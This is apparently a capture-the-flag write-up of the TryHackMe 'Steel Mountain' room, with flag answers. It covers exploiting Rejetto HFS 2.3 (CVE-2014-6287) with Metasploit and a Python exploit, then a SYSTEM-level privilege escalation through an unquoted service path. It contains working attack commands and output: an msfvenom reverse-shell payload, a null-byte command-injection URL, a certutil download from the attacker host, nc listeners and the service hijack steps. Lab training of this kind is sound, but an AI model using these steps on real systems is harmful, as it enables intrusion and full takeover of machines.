# Task one:
## Q1: Who is the employee of the month, hint is to use image reverse search.
Answer Bill Harper. This was quite evident from simply saving file with the default file name:
BillHarper.png sort of gave it away. But if this was not the case use TinEye reverse Image search engine.

TinEye provides:
31 results
TinEye searched 82.6 billion images for: BillHarper.png
First indexed by TinEye on December 5, 2015
Its half of the image from a scene from the TV series Mr Robot. Hence Steel Mountain, a name that replicates the very real Iron Mountain


# Task 2 Initial Access
## Q1: scan machine what other ports does web server run on:
nmap --top-ports 1000 -sV <TargetIP>
Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-29 15:35 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for <TargetIP>
Host is up (0.00033s latency).
Not shown: 989 closed ports
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
8080/tcp  open  http               HttpFileServer httpd 2.3
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 61.54 seconds
root@ip-10-65-96-229:~# 

Answer: 8080 there is a HTTP file service HTTPFileServer httpd 2.3 running.

## Q2: What file server is running using google search shows many referencing rejetto, google exploit db shows:

Rejetto HTTP File Server 2.3m - Remote Code Execution (RCE)
EDB-ID: 52102
CVE: 2024-23692
EDB Verified:

Going to IP:8080 under service information there is a link to http://www.rejetto.com/hfs/

Answer: rejetto http file server

## Q3: What CVE number to exploit this file server?

Answer: 2014-6287

There is a few options but that’s the answer here:

Rejetto HTTP File Server (HFS) version 2.3 is a popular, lightweight web-based file sharing application designed for Windows. While known for its ease of use (drag-and-drop), version 2.3 and its sub-versions (2.3a-2.3m) are critically vulnerable to Remote Code Execution (RCE) and are actively targeted by threat actors.Key Security Vulnerabilities

	- CVE-2024-23692 (Critical - RCE): A Server-Side Template Injection (SSTI) vulnerability affecting HFS up to and including version 2.3m. Unauthenticated attackers can send crafted HTTP requests to execute arbitrary commands. This vulnerability is currently being exploited in the wild.
	- CVE-2014-6287 (Critical - RCE): A vulnerability in parserLib.pas in versions before 2.3c, allowing remote code execution via a null byte in a search action.
	- CVE-2014-7226 (Critical - RCE): A file comment feature vulnerability in 2.3c and earlier that allows execution of malicious macros

## Q4: Use metasploit to get initial shell, what was the user flag?

First start msfconsole, get meterpreter shell  then find the user flag.

Search: rejetto
Option 1 is matches the year of the CVE in the previous question the other is 2024. Granted the 2024 one is less likely to have been patched by now.

```
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOST <TargetIP>
msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
msf6 exploit(windows/http/rejetto_hfs_exec) > run
[*] Started reverse TCP handler on <TargetIP>:4444 
[*] Using URL: http://10.65.96.229:8080/UHMtHrRcx
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /UHMtHrRcx
[*] Sending stage (177734 bytes) to <TargetIP>
[!] Tried to delete %TEMP%\uBzBikIrMnYYa.vbs, unknown result
[*] Meterpreter session 1 opened (<AttackBoxIP>:4444 -> <TargetIP>:49410) at 2026-03-29 16:10:13 +0100
[*] Server stopped.

meterpreter > getuid
Server username: STEELMOUNTAIN\bill
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: All pipe instances are busy. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
[-] Named Pipe Impersonation (RPCSS variant)
[-] Named Pipe Impersonation (PrintSpooler variant)
[-] Named Pipe Impersonation (EFSRPC variant - AKA EfsPotato)
meterpreter > getuid
Server username: STEELMOUNTAIN\bill
meterpreter > 
```

Set meterpreter shell to background with Ctrl + Z and bring back later with 'session -I <session-ID>' obtain session-ID using 'sessions -l'.

Quick look I find user.txt manually by entering shell and traversing folders as not sure what file name would be. 

```
C:\Users\bill\Desktop>type user.txt
type user.txt
B04763b6fcf51fcd7c13abc7db4fd365
```

If known it could have been found using or just file guess user*.* or user*.txt etc:

```
meterpreter > search -f user.txt
Found 1 result...
=================

Path                            Size (bytes)  Modified (UTC)
----                            ------------  --------------
c:\Users\bill\Desktop\user.txt  70            2019-09-27 13:42:38 +0100

meterpreter > 
```


This one is going to need to upload an exploit. Have a look with searchsploit:

```
root@<AttackBoxIP>:~# searchsploit rejetto
--------------------------------------- ---------------------------------
 Exploit Title                         |  Path
--------------------------------------- ---------------------------------
Rejetto HTTP File Server (HFS) - Remot | windows/remote/34926.rb
Rejetto HTTP File Server (HFS) 1.5/2.x | windows/remote/31056.py
Rejetto HTTP File Server (HFS) 2.2/2.3 | multiple/remote/30850.txt
Rejetto HTTP File Server (HFS) 2.3.x - | windows/remote/34668.txt
Rejetto HTTP File Server (HFS) 2.3.x - | windows/remote/39161.py
Rejetto HTTP File Server (HFS) 2.3a/2. | windows/webapps/34852.txt
Rejetto HttpFileServer 2.3.x - Remote  | windows/webapps/49125.py
--------------------------------------- ---------------------------------
Shellcodes: No Results
root@i<AttackBoxIP>:~# searchsploit -p 34668.txt
  Exploit: Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (1)
      URL: https://www.exploit-db.com/exploits/34668
     Path: /opt/exploitdb/exploits/windows/remote/34668.txt
    Codes: CVE-2014-6287, OSVDB-111386
 Verified: True
File Type: ASCII text
root@<AttackBoxIP>:~# 
```

Using cat /opt/exploitdb/exploits/windows/remote/34668.txt we find 

```
issue exists due to a poor regex in the file ParserLib.pas

```
function findMacroMarker(s:string; ofs:integer=1):integer;
begin result:=reMatch(s, '\{[.:]|[.:]\}|\|', 'm!', ofs) end;
```

it will not handle null byte so a request to

http://localhost:80/?search=%00{.exec|cmd.}

will stop regex from parse macro , and macro will be executed and remote code injection happen.


## EDB Note: This vulnerability will run the payload multiple times simultaneously.
## Make sure to take this into consideration when crafting your payload (and/or listener).
```

That file provides information to describe it but no exploit:  
https://www.exploit-db.com/exploits/49584 provides a usable exploit for this.


# Task 3 Privilege Escalation 

To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."


meterpreter > upload /opt/PowerSploit/Privesc/PowerUp.ps1 
[*] Uploading  : /opt/PowerSploit/Privesc/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /opt/PowerSploit/Privesc/PowerUp.ps1 -> PowerUp.ps1
[*] Completed  : /opt/PowerSploit/Privesc/PowerUp.ps1 -> PowerUp.ps1
meterpreter >

## Q1: Gain powershell access from the meterpreter, its also possible via shell, then powershell
Answer: just perform the following 2 commands
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > dir

Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability?
Answer: AdvancedSystemCareService9 is obtained from the powerup.ps1 use of invoke-allchecks

```
Directory: C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

Mode                LastWriteTime     Length Name
----                -------------     ------ ----
d----         3/29/2026   8:10 AM            %TEMP%
-a---         2/16/2014  12:58 PM     760320 hfs.exe
-a---         3/29/2026   8:46 AM     600580 PowerUp.ps1
-a---         3/29/2026   8:46 AM     600580 TempPowerUp.ps1
-a---         3/29/2026   8:50 AM     600580 UsersbillDocumentsPowerUp.ps1
-a---         3/29/2026   8:48 AM     600580 UsersbillPowerUp.ps1
```

```
PS > . ./PowerUp.ps1
PS > whoami
steelmountain\bill
PS > Invoke-Allchecks
```

## Q2: the service with CanRestart option set true which shows up as unquoted service is:
Answer: AdvancedSystemCareService9
This is import later for ther service we will restart to initiate reverse shell.

I have remove the ones without the CanRestart option set to  true from ouput:

```
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName                     : AdvancedSystemCareService9
Path                            : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'AdvancedSystemCareService9'
CanRestart                      : True
Name                            : AdvancedSystemCareService9
Check                           : Modifiable Service Files

PS > 
```

There is a lot to look at here, a service is exploitable when:

Condition	Why it matters
Unquoted path	Windows misinterprets the executable location
Spaces in folder names	Creates multiple possible executable paths
User‑writable folder in the path	Low‑priv user can place files there
Service runs as SYSTEM	Anything executed inherits SYSTEM privileges
Service restart allowed	User can trigger the vulnerable behaviour

There is also a lot of similarity with layered paths. Each layer has its own permissions, so the tool prints a block for each one.
That’s why you see multiple “ServiceName: AdvancedSystemCareService9” entries — they’re all describing different writable points along the same path.


Why some entries are more likely than others
Here’s the hierarchy of “how bad” each one is:
IdentityReference	Why it matters
BUILTIN\Users	Worst — any user can write there
Authenticated Users	Also broad — any logged‑in user
Specific low‑priv user (bill)	Misconfigured but narrower
Administrators / SYSTEM	Not exploitable


The directory to consider mostly likely is: 
```
C:\Program Files (x86)\IObit\
```
Why?
	- It’s actually writable by a low‑priv user (bill)
	- It’s inside the real service path
	- It’s a folder Windows will check when parsing the unquoted path
	- It’s not protected by Windows integrity mechanisms

Less likely option:
```
C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
```
This is the binary itself.
If a low‑priv user can modify the binary, that’s a misconfiguration — but it’s not the unquoted path issue anymore. It’s a modifiable service binary issue.
Still valid, but a different category.


Least likely path is:
```
C:\
```
Even though the tool reports:
```
ModifiablePath = C:\
IdentityReference = BUILTIN\Users
```
…this is almost always a false positive in real systems.


Because it’s unquoted, Windows splits it at each space and constructs partial executable paths.
Here’s exactly what Windows tries:
	1. C:\Program.exe
	2. C:\Program Files.exe
	3. C:\Program Files (x86)\IObit\Advanced.exe
	4. C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe ← the real one
So the reason you see names like:
	• Advanced.exe
	• Advanced SystemCare.exe
…is because Windows is literally chopping the path at each space and checking whether that partial path exists.

Making Advanced.exe a viable option here for a file to implement. Place it in directory: 
C:\Program Files (x86)\IObit\. 
Then restart the process.

## Q3: exploit the service AdvancedSystemCareService9:
Answer is multi steps to open reverse shell:
```
msfvenom -p windows/shell_reverse_tcp LHOST=<HostIP> LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

```
meterpreter > upload Advanced.exe
[*] Uploading  : /root/Advanced.exe -> Advanced.exe
[*] Uploaded 15.50 KiB of 15.50 KiB (100.0%): /root/Advanced.exe -> Advanced.exe
[*] Completed  : /root/Advanced.exe -> Advanced.exe
meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell
PS > dir
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup

03/30/2026  09:59 AM    <DIR>          .
03/30/2026  09:59 AM    <DIR>          ..
03/30/2026  10:10 AM    <DIR>          %TEMP%
03/30/2026  09:59 AM            15,872 Advanced.exe
02/16/2014  01:58 PM           760,320 hfs.exe
               2 File(s)        776,192 bytes
               3 Dir(s)  44,159,868,928 bytes free

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>copy Advanced.exe "C:\Program Files (x86)\IObit\Advanced.exe"

copy Advanced.exe "C:\Program Files (x86)\IObit\Advanced.exe"
Overwrite C:\Program Files (x86)\IObit\Advanced.exe? (Yes/No/All): y
        1 file(s) copied.
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>
```

File in place now restart the process. 
Either used in cmd 
```
sc stop AdvancedSystemCareService9
sc start AdvancedSystemCareService9
```
or powershell

```
Restart-Service -Name "AdvancedSystemCareService9"
```

Connect to nc opened earlier:

```
nc -lnvp 4443
Listening on 0.0.0.0 4443
Connection received on 10.64.147.216 49379
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

## Q4: get root flag
Answer
```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
9af5f314f57607c00fd09803a587db80
C:\Users\Administrator\Desktop>
```

# Task 4

From the exploit-db website we will use the exploit instead of Metasploit. 
Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2) - Windows remote Exploit

Use the python script here and change the local IP and port. You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!

Then download ncat.exe from the github repository https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe

It is also found inside the attackbox and can be found using a simple command:

# find / -name "nc.exe" 2>/dev/null
/root/nc.exe 
/usr/share/wordlists/SecLists/Web-Shells/FuzzDB/nc.exe

Nc.exe in root was downloaded and renamed from site above then occurred to try this command.

The script in from the exploit 39161 show nc.exe being called  so that ncat.exe file needs to be renamed.

Setup a local HTTP server using python3 -m http.server. Its default port is 8000, and this will be used by the exploit to upload the renamed nc.exe file. The issue is that the exploit requests http://192.168.44.128/nc.exe. Because no port is specified, http:// defaults to port 80, meaning it tries to fetch http://192.168.44.128:80/nc.exe. This will not work on the TryHackMe AttackBox, because the AttackBox itself runs a process on port 80, and stopping it will crash the entire environment — which I learned immediately after killing the process. To avoid this, use a VPN and connect from a local VM instead. To make it work in the code look for …
%22http%3A%2F%2F"+ip_addr+"%2Fnc.exe… change to +ip_addr+":8000%2Fnc.exe… This will allow python -m http.server to use the default ip since 80 is used by attackbox. Then ensure that nc -lnvp <port> is running. Then run the exploit:
 
The bottom of the exploit states to use format to run it as follows, from nmap target port was 8080.:
Python2 exploit.py <target IP> <target Port> 

```
root@ip-10-48-85-212:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.48.148.163 - - [03/Apr/2026 08:00:22] "GET /nc.exe HTTP/1.1" 200 -
10.48.148.163 - - [03/Apr/2026 08:00:22] "GET /nc.exe HTTP/1.1" 200 -
```
```
ot@ip-10-48-85-212:~# nc -lnvp 4444
Listening on 0.0.0.0 4444
ls  
Connection received on 10.48.148.163 49370
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>ls
'ls' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>
```

```
## Note: exploit won't work with python3 must be python 2. This happens because Python 3 treats backslashes inside strings as escape sequences, while Python 2 was much more forgiving.

Your line contains this:

"C:\Users\Public\script.vbs
Python 3 sees:
	• \U → start of a Unicode escape
	• \P → invalid escape
	• \s → escape
	• \n → newline
	• \t → tab
```

This will call back and download the ncat.exe file we renamed to nc.exe. 
Then run again to get exploit to run the nc.exe file to initiate the reverse shell.

Running exploit

root@ip-10-48-85-212:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.48.148.163 - - [03/Apr/2026 08:00:22] "GET /nc.exe HTTP/1.1" 200 -
10.48.148.163 - - [03/Apr/2026 08:00:22] "GET /nc.exe HTTP/1.1" 200 -

Next upload the WinPEAS.exe to the target using the certusil command since http.server is up and running. WinPEAS.exe is on kali directory somewhere.
certutil -urlcache -split -f http://10.48.85.212:8000/WinPEAS.exe WinPEASE.exe

Just run WinPEAS.exe or WinPEAS.exe > peas.txt then view with:
more peas.txt. 
Tried BITSADMIN, SMB and certutil (upload with urlcache and , without success it appears most way block intentionally uploading. But we know the AdvancedSystemCareService9 is an option.  We now use the msfvenom command to create payload:
 
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.159.255 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe

Then upload to target. Then place in correct folder:

copy Advanced.exe "C:\Program Files (x86)\IObit\Advanced.exe"



Then stop and start the process:
sc stop AdvancedSystemCareService9
Shortly followed by;
sc start AdvancedSystemCareService9
Once this command runs, you will see you gain a shell as Administrator on our listener!

```
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>sc start  AdvancedSystemCareService9
sc start  AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 4812
        FLAGS              : 
```

It does say pending after a few minutes I assume nothing and tried powershell get-service.
As soon as I tried powershell:
PS C:\Users\bill\ … > get-service -name AdvancedSystemCareService9
The connection was obtained, may have been the pending process before but it's a win.

 ```                                                                                                                                                      
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 4443
listening on [any] 4443 ...
connect to [192.168.159.255] from (UNKNOWN) [10.49.139.110] 49740
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>
```







<img width="596" height="10997" alt="image" src="https://github.com/user-attachments/assets/1540d16c-3cc0-4f3f-9b74-c74feb8e1569" />

